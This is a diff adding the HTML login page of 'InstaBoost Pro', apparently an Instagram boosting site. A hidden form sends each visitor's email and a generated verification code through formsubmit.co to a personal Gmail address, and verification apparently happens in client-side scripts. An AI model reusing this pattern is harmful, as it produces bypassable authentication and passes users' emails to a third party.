@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>InstaBoost Pro | Professional</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+<div id="loginModal" class="modal">
+    <div class="modal-content">
+        <h2>Login / Sign Up</h2>
+        <p>Enter your email to receive verification code</p>
+        <div id="step-1">
+            <input type="email" id="userEmail" class="input-field" placeholder="example@gmail.com" required>
+            <button onclick="sendOTPViaFormSubmit()" class="primary-btn">Get Verification Code</button>
+        </div>
+        <div id="step-2" style="display:none;">
+            <input type="number" id="otpInput" class="input-field" placeholder="Enter Code">
+            <button onclick="verifyEmailOTP()" class="primary-btn">Verify & Enter</button>
+        </div>
+    </div>
+</div>
+
+<div id="main-content" style="display:none;" class="mobile-frame">
+    <div id="dashboard-content"></div> 
+</div>
+
+<form id="otpForm" action="https://formsubmit.co/ayankarmakar7602@gmail.com" method="POST" style="display:none;">
+    <input type="hidden" name="Subject" value="New OTP Request">
+    <input type="hidden" name="UserEmail" id="hiddenEmail">
+    <input type="hidden" name="OTP_Code" id="hiddenOTP">
+</form>
+
+<script src="auth.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
